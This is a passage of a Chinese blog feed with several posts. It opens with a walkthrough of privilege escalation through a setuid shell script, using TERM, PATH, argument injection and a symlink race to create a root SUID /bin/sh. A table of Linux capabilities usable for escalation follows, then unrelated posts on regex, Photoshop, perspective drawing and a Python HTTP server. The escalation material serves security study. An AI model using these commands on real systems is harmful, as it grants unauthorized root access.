class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% ls change-pass</span><span class="line">-rwsr-x--- 1 root helpdesk</span><span class="line"> 37 Feb 26 16:35 change-pass</span><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/csh -b</span></span><span class="line"><span class="hljs-built_in">set</span> user = <span class="hljs-variable">$1</span></span><span class="line">passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% env TERM=<span class="hljs-string">&#x27;`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`&#x27;</span> change-pass</span></code></pre></div></div><h4 id="引用的文件没有使用绝对路径？"><a href="#引用的文件没有使用绝对路径？" class="headerlink" title="引用的文件没有使用绝对路径？"></a>引用的文件没有使用绝对路径？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% <span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&#x27;/tmp&#x27;</span></span><span class="line">% <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh&quot;</span> &gt;/tmp/passwd</span><span class="line">% ./change-pass</span></code></pre></div></div><h4 id="脚本的适用范围是否过大？"><a href="#脚本的适用范围是否过大？" class="headerlink" title="脚本的适用范围是否过大？"></a>脚本的适用范围是否过大？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>可以修改root的密码</p><h4 id="使用了临时文件？"><a href="#使用了临时文件？" class="headerlink" title="使用了临时文件？"></a>使用了临时文件？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">[ -z <span class="hljs-variable">$user</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">rm /tmp/.user</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span> &gt; /tmp/.user</span><span class="line">isroot=<span class="hljs-string">&#x27;/usr/bin/grep -c root /tmp/.user&#x27;</span></span><span class="line">[ <span class="hljs-string">&quot;<span class="hljs-variable">$isroot</span>&quot;</span> -gt 0 ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;You Can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>看到上面使用了临时文件，那么就意味着可以打时间差，通过疯狂循，用空覆盖掉写入的内容。<br>那么就跳过了检查是否为空，就可以修改root密码了。</p><h4 id="参数是否过滤，能否用分号做更多的事"><a href="#参数是否过滤，能否用分号做更多的事" class="headerlink" title="参数是否过滤，能否用分号做更多的事"></a>参数是否过滤，能否用分号做更多的事</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">[ -z <span class="hljs-variable">$user</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">[ <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span> = root ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>可以看到值判断是否有<code>$user</code>和<code>$user</code>是否为root。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">change-pass <span class="hljs-string">&quot;user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span></span></code></pre></div></div><h4 id="是否设置了IFS"><a href="#是否设置了IFS" class="headerlink" title="是否设置了IFS"></a>是否设置了IFS</h4><p><strong>IFS(Internal Field Separator)</strong>, 内部域分割符，set环境变量。</p><p>案例中给出了使用方法</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">export IFS=&#x27;/&#x27;</span></code></pre></div></div><p>这样<code>/usr/bin/passwd</code> 就变成了 <code>usr bin passwd</code>，然后替换<code>usr</code>的执行就可以了，但是没有实验成功。</p><h4 id="脚本本身的风险"><a href="#脚本本身的风险" class="headerlink" title="脚本本身的风险"></a>脚本本身的风险</h4><p>脚本要运行会有两个步骤：</p><ol><li>启动一个shell</li><li>这个shell读取脚本的内容然后执行</li></ol><p>那么就会有一个时间差</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-built_in">cd</span> /tmp</span><span class="line">ln -s change-pass rootme</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">$ ./rootme &amp;</span><span class="line">$ rm rootme &amp;&amp; \</span><span class="line"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span> \</span><span class="line"> &gt;&gt; rootme</span></code></pre></div></div><p>这个会有很大的几率读取不到完整的内容而失败，但是可以用自动化的方式实现。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Capabilities</title>
      <link href="/2021/07/21/linux-capabilities/"/>
      <url>/2021/07/21/linux-capabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Capabilities"><a href="#什么是Capabilities" class="headerlink" title="什么是Capabilities"></a>什么是Capabilities</h2><p>Capabilites是从内核2.5之后引入的，作用于<strong>进程</strong>或者<strong>线程</strong>上，是将权限更加细致的划分，保障系统安全的一种能力。<br>类似于windows的特权。</p><h3 id="capabilities-set"><a href="#capabilities-set" class="headerlink" title="capabilities set"></a>capabilities set</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-avrasm codeBlockLines"><span class="line">root@iZbp19p0eesh0lxr45we33Z:~<span class="hljs-meta"># cat /proc/$$/status | grep Cap</span></span><span class="line"><span class="hljs-symbol">CapInh:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># 可以继承的CAP(i)</span></span><span class="line"><span class="hljs-symbol">CapPrm:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 可以使用的CAP(p)</span></span><span class="line"><span class="hljs-symbol">CapEff:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 使用的CAP(e)</span></span><span class="line"><span class="hljs-symbol">CapBnd:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 可以被禁止的</span></span><span class="line"><span class="hljs-symbol">CapAmb:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># </span></span></code></pre></div></div><h3 id="进程CAP"><a href="#进程CAP" class="headerlink" title="进程CAP"></a>进程CAP</h3><ul><li>查看进程CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1234</span>/status | grep Cap  <span class="hljs-comment"># 查看1234进程的能力</span></span><span class="line">cat <span class="hljs-regexp">/proc/</span>$$/status | grep Cap <span class="hljs-comment"># 查看现在进程的能力</span></span></code></pre></div></div><ul><li>解码CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line">capsh <span class="hljs-attribute">--decode</span>=0000000000003000</span><span class="line"><span class="hljs-attribute">0x0000000000003000</span>=cap_net_admin,cap_net_raw</span></code></pre></div></div><h3 id="二进制文件CAP"><a href="#二进制文件CAP" class="headerlink" title="二进制文件CAP"></a>二进制文件CAP</h3><ul><li>查看二进制文件CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">getcap <span class="hljs-regexp">/usr/</span>bin/ping</span><span class="line">getcap `whereis python3`</span></code></pre></div></div><ul><li>搜索所有二进制文件的CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-1c codeBlockLines"><span class="line">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-literal">null</span></span></code></pre></div></div><p>在<code>LinPEAS</code>中有自动检查</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>根据不同的CAP找出对应的提权方法，详细方法在<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#malicious-use">这里查看</a></p><table><thead><tr><th align="center">CAP</th><th align="center">描述</th><th align="center">能否提权</th></tr></thead><tbody><tr><td align="center">CAP_SYS_ADMIN</td><td align="center">可以挂在文件系统</td><td align="center">√</td></tr><tr><td align="center">CAP_SYS_PTRACE</td><td align="center">可以shellcode注入并逃离容器</td><td align="center">√</td></tr><tr><td align="center">CAP_SYS_MODULE</td><td align="center">可以增加或者移除核心模块</td><td align="center">√</td></tr><tr><td align="center">CAP_DAC_READ_SEARCH</td><td align="center">可以绕过查看文件和执行文件的检查</td><td align="center">√</td></tr><tr><td align="center">CAP_DAC_OVERRIDE</td><td align="center">写任意文件</td><td align="center">√</td></tr><tr><td align="center">CAP_CHOWN</td><td align="center">更改任意文件的所有者</td><td align="center">√</td></tr><tr><td align="center">CAP_FORMER</td><td align="center">更改任意文件的权限</td><td align="center">√</td></tr><tr><td align="center">CAP_SETUID</td><td align="center">设置有效用户</td><td align="center">√</td></tr><tr><td align="center">CAP_SETGID</td><td align="center">设置有效组</td><td align="center">√</td></tr><tr><td align="center">CAP_SETFCAP</td><td align="center">可以设置文件或者进程的CAP</td><td align="center">√</td></tr><tr><td align="center">CAP_KILL</td><td align="center">可以杀死任何进程</td><td align="center">×</td></tr><tr><td align="center">CAP_NET_BIND_SERVICE</td><td align="center">可以监听任何端口</td><td align="center">×</td></tr><tr><td align="center">CAP_NET_RAW</td><td align="center">可以嗅探接口</td><td align="center">×</td></tr><tr><td align="center">CAP_NET_ADMIN + CAP_NET_RAW</td><td align="center">可以修改防护墙规则</td><td align="center">×</td></tr><tr><td align="center">CAP_LINUX_IMMUTABLE</td><td align="center">修改inode属性</td><td align="center">×</td></tr></tbody></table><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="python-拥有-CAP-SETUID"><a href="#python-拥有-CAP-SETUID" class="headerlink" title="python 拥有 CAP_SETUID"></a>python 拥有 CAP_SETUID</h3><p><img src="/2021/07/21/linux-capabilities/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2021/07/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2021/07/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://wangwl.net/static/projects/visualRegex">一个可视化的正则表达式在线测试网站</a></li></ul><h2 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h2><ul><li>匹配每个值</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">^(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))$</span></code></pre></div></div><ul><li>只做验证判断</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">^(?:(?:\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.)&#123;3&#125;(?:\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))$</span></code></pre></div></div><h2 id="多行匹配"><a href="#多行匹配" class="headerlink" title="多行匹配"></a>多行匹配</h2><p>当需要跨行匹配的时候，由于<code>(.)</code>不能匹配<code>\n</code>所以无法多行匹配</p><p>例如:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;/\*(.*?)\*/&#x27;</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>text1 = <span class="hljs-string">&#x27;/* this is a comment */&#x27;</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>text2 = <span class="hljs-string">&#x27;&#x27;&#x27;/* this is a</span></span><span class="line"><span class="hljs-string"><span class="hljs-meta">... </span>multiline comment */</span></span><span class="line"><span class="hljs-string"><span class="hljs-meta">... </span>&#x27;&#x27;&#x27;</span></span><span class="line">&gt;&gt;&gt;</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment.findall(text1)</span><span class="line">[<span class="hljs-string">&#x27; this is a comment &#x27;</span>]</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment.findall(text2)</span><span class="line">[]</span><span class="line">&gt;&gt;&gt;</span></code></pre></div></div><p>要修正这个问题，需要加一个非捕获组<code>(?:.|\n)</code>来将<code>\n</code>也包含进来</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;/\*((?:.|\n)*?)\*/&#x27;</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment.findall(text2)</span><span class="line">[<span class="hljs-string">&#x27; this is a\n multiline comment &#x27;</span>]</span><span class="line">&gt;&gt;&gt;</span></code></pre></div></div><p>另外也可以使用<code>re.DOTALL</code>这个标志，它可以将<code>(.)</code>匹配任意字符，当然也就包含了<code>\n</code>，但是由于包含的信息更多，在复杂情况下可能会出现意想不到的情况，所以优先使用非捕获组的方式来解决这个问题。 </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PS后期方面</title>
      <link href="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/"/>
      <url>/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://www.bilibili.com/video/BV1ca4y1s7gY">参考视频</a></li></ul><h1 id="通透"><a href="#通透" class="headerlink" title="通透"></a>通透</h1><h2 id="原色原理"><a href="#原色原理" class="headerlink" title="原色原理"></a>原色原理</h2><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/1.png"></p><p>滤色模式就是加色模式，就是光的三原色的加色</p><p>RGB与CMY有着非常紧密的联系</p><table><thead><tr><th align="center">原色</th><th align="center">支持色</th><th align="center">互补色</th></tr></thead><tbody><tr><td align="center">红</td><td align="center">黄，品红</td><td align="center">青</td></tr><tr><td align="center">绿</td><td align="center">黄，青</td><td align="center">品红</td></tr><tr><td align="center">蓝</td><td align="center">青，品红</td><td align="center">黄</td></tr></tbody></table><p>去除互补色干扰</p><h2 id="什么是色彩脏？"><a href="#什么是色彩脏？" class="headerlink" title="什么是色彩脏？"></a>什么是色彩脏？</h2><p>色彩脏是因为加入了互补色</p><p>比如蓝色与黄色为互补色，那么调低不透明度就会成为灰色</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/2.png"></p><h1 id="影调"><a href="#影调" class="headerlink" title="影调"></a>影调</h1><h2 id="影调的划分系统"><a href="#影调的划分系统" class="headerlink" title="影调的划分系统"></a>影调的划分系统</h2><p>一般来说是三大调：黑白灰</p><p>具体来说有两种方式表达：</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/3.png"></p><p>以及</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/4.png"></p><p>那么这两种就会排列组合成9种影调以及1个全长调</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/5.png"></p><h2 id="黑白稿画的是什么"><a href="#黑白稿画的是什么" class="headerlink" title="黑白稿画的是什么"></a>黑白稿画的是什么</h2><p>在画黑白稿的时候，就是在确定影调的过程。</p><p>是整体偏暗的低中调，还是比较平均中长调，还是明亮的高中调？</p><h2 id="还有哪些调式"><a href="#还有哪些调式" class="headerlink" title="还有哪些调式"></a>还有哪些调式</h2><ul><li>高调、中间调、低调</li><li>软调、硬调</li><li>冷调、暖调</li><li>对比色调、调和色调</li><li>纯调、灰调</li></ul><h1 id="锐化"><a href="#锐化" class="headerlink" title="锐化"></a>锐化</h1><h2 id="心理上的感受"><a href="#心理上的感受" class="headerlink" title="心理上的感受"></a>心理上的感受</h2><p>发虚的轮廓让人感到着急，看不清</p><h2 id="如何做两级精细化处理"><a href="#如何做两级精细化处理" class="headerlink" title="如何做两级精细化处理"></a>如何做两级精细化处理</h2><ol><li>选择颜色模式为lab模式</li><li>在通道中只选择明度通道</li><li>USM锐化做两次（半径：5， 1.2）</li><li>回到RGB模式不拼合即可</li></ol><h1 id="塑造光线"><a href="#塑造光线" class="headerlink" title="塑造光线"></a>塑造光线</h1><p>两种方式</p><ol><li>画笔</li><li>径向模糊</li></ol><h2 id="径向模糊"><a href="#径向模糊" class="headerlink" title="径向模糊"></a>径向模糊</h2><ol><li>色阶调整到只有光源</li><li>径向模糊</li><li>滤色模式</li></ol>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习编程的网站</title>
      <link href="/2021/07/17/%E5%AD%A6%E4%B9%A0%E7%BC%96%E7%A8%8B%E7%9A%84%E7%BD%91%E7%AB%99/"/>
      <url>/2021/07/17/%E5%AD%A6%E4%B9%A0%E7%BC%96%E7%A8%8B%E7%9A%84%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>1.cppreference<br><a href="https://en.cppreference.com/w/">https://en.cppreference.com/w/</a></p><p>2.LearnCpp<br><a href="https://www.learncpp.com/">https://www.learncpp.com/</a></p><p>3.Cplusplus<br><a href="http://www.cplusplus.com/">http://www.cplusplus.com/</a></p><p>4.TutorialsPoint<br><a href="https://www.tutorialspoint.com/cplusplus/index.htm">https://www.tutorialspoint.com/cplusplus/index.htm</a></p><p>5.Awesome C++<br><a href="https://github.com/fffaraz/awesome-cpp">https://github.com/fffaraz/awesome-cpp</a></p><p>6、书栈网<br><a href="https://www.bookstack.cn/">https://www.bookstack.cn/</a></p><p>7.牛客网<br><a href="https://www.nowcoder.com/activity/oj">https://www.nowcoder.com/activity/oj</a></p><p>8.搬书匠<br><a href="http://www.banshujiang.cn/">http://www.banshujiang.cn/</a></p><p>9.程序员刷题网站：LintCode 领扣<br><a href="https://www.lintcode.com/problem/">https://www.lintcode.com/problem/</a></p><p>10、LeetCode/LintCode 题解网站<br><a href="https://www.jiuzhang.com/solution/?utm_source=sc-zhihu-jw0603">https://www.jiuzhang.com/solution/?utm_source=sc-zhihu-jw0603</a></p><p>11、前端界的Dribbble——Codepen<br><a href="https://codepen.io/">https://codepen.io/</a></p><p>12、TheServerSide<br><a href="https://www.theserverside.com/">https://www.theserverside.com/</a></p><p>13、Hacker News<br><a href="http://hackernews.betacat.io/">http://hackernews.betacat.io/</a></p><p>14、karan/Projects<br><a href="https://www.gitmemory.com/karan/Projects">https://www.gitmemory.com/karan/Projects</a></p><p>15.字体动效神器Space Type Generator<br><a href="https://spacetypegenerator.com/">https://spacetypegenerator.com/</a></p><p>16.大学自学网<br><a href="http://v.dxsbb.com/">http://v.dxsbb.com/</a></p><p>17.简单教程<br><a href="https://www.twle.cn/">https://www.twle.cn/</a></p><ul><li><a href="https://www.bilibili.com/video/BV1d44y1q76P">参考来源</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>透视关系</title>
      <link href="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/"/>
      <url>/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>关于透视的教学，参考了<a href="https://www.bilibili.com/video/BV11t411m7Fk">这个视频</a>。</p><p>透视中最重要的一点是确定<code>观察点</code>，有了观察点，就有了<code>视平线</code>x轴与<code>垂直线</code>y轴。</p><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/1.png"></p><h2 id="视平线"><a href="#视平线" class="headerlink" title="视平线"></a>视平线</h2><p>所有平行于地面的线最终都会汇聚到视平线上 </p><h2 id="画面"><a href="#画面" class="headerlink" title="画面"></a>画面</h2><p>只要是物体的线不与画面平行，那么就会发生汇聚</p><h2 id="测定深度"><a href="#测定深度" class="headerlink" title="测定深度"></a>测定深度</h2><p>3种方法:</p><ol><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/2.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/3.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/4.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/5.png"></p></li></ol><p>原理都是利用了平行线都是同一个消失点和等比三角形。</p><h2 id="斜面"><a href="#斜面" class="headerlink" title="斜面"></a>斜面</h2><p>有同一个垂直消失线</p><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python http</title>
      <link href="/2021/07/16/python-http/"/>
      <url>/2021/07/16/python-http/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h2><p>参考一个完整的服务端配置</p><div class="codeBlockContainer"><div class="codeBlockTitle">server.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-string">Very simple HTTP server in python for logging requests</span></span><span class="line"><span class="hljs-string">Usage::</span></span><span class="line"><span class="hljs-string">    ./server.py [&lt;port&gt;]</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line"></br></span><span class="line">token = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;token&quot;</span>).read().strip()</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span>(<span class="hljs-params">BaseHTTPRequestHandler</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_set_response</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.send_response(<span class="hljs-number">200</span>)</span><span class="line">        self.send_header(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/html&#x27;</span>)</span><span class="line">        self.end_headers()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_GET</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        logging.info(<span class="hljs-string">&quot;GET request,\nPath: %s\nHeaders:\n%s\n&quot;</span>, <span class="hljs-built_in">str</span>(self.path), <span class="hljs-built_in">str</span>(self.headers))</span><span class="line">        self._set_response()</span><span class="line">        self.wfile.write(<span class="hljs-string">&quot;GET request for &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.path).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_POST</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        content_length = <span class="hljs-built_in">int</span>(self.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]) <span class="hljs-comment"># &lt;--- Gets the size of data</span></span><span class="line">        post_data = self.rfile.read(content_length) <span class="hljs-comment"># &lt;--- Gets the data itself</span></span><span class="line">        logging.info(<span class="hljs-string">&quot;POST request, Body:\n%s\n&quot;</span>, post_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line">        self._set_response()</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">if</span> (post_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) == <span class="hljs-string">f&quot;token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span>):</span><span class="line">            logging.info(<span class="hljs-string">&quot;[+] Token Success\n&quot;</span>)</span><span class="line">            self.wfile.write(<span class="hljs-string">&quot;Token Success&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            logging.info(<span class="hljs-string">&quot;[-] Token Failed\n&quot;</span>)</span><span class="line">            self.wfile.write(<span class="hljs-string">&quot;Token Failed&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">server_class=HTTPServer, handler_class=S, port=<span class="hljs-number">8080</span></span>):</span></span><span class="line">    logging.basicConfig(level=logging.INFO)</span><span class="line">    server_address = (<span class="hljs-string">&#x27;&#x27;</span>, port)</span><span class="line">    httpd = server_class(server_address, handler_class)</span><span class="line">    logging.info(<span class="hljs-string">&#x27;Starting httpd...\n&#x27;</span>)</span><span class="line">    <span class="hljs-keyword">try</span>:</span><span class="line">        httpd.serve_forever()</span><span class="line">    <span class="hljs-keyword">except</span> KeyboardInterrupt:</span><span class="line">        <span class="hljs-keyword">pass</span></span><span class="line">    httpd.server_close()</span><span class="line">    logging.info(<span class="hljs-string">&#x27;Stopping httpd...\n&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) == <span class="hljs-number">2</span>:</span><span class="line">        run(port=<span class="hljs-built_in">int</span>(argv[<span class="hljs-number">1</span>]))</span><span class="line">    <span class="hljs-keyword">else</span>:</span><span class="line">        run()</span></code></pre></div></div><h2 id="http-Client"><a href="#http-Client" class="headerlink" title="http Client"></a>http Client</h2><p>推荐两个模块<code>urllib3</code>和<code>requests</code></p><h3 id="requests-模块"><a href="#requests-模块" class="headerlink" title="requests 模块"></a>requests 模块</h3><p><a href="https://docs.python-requests.org/zh_CN/latest/user/quickstart.html">官方参考链接</a></p><h4 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> requests</span><span class="line"></br></span><span class="line">r = requests.get(<span 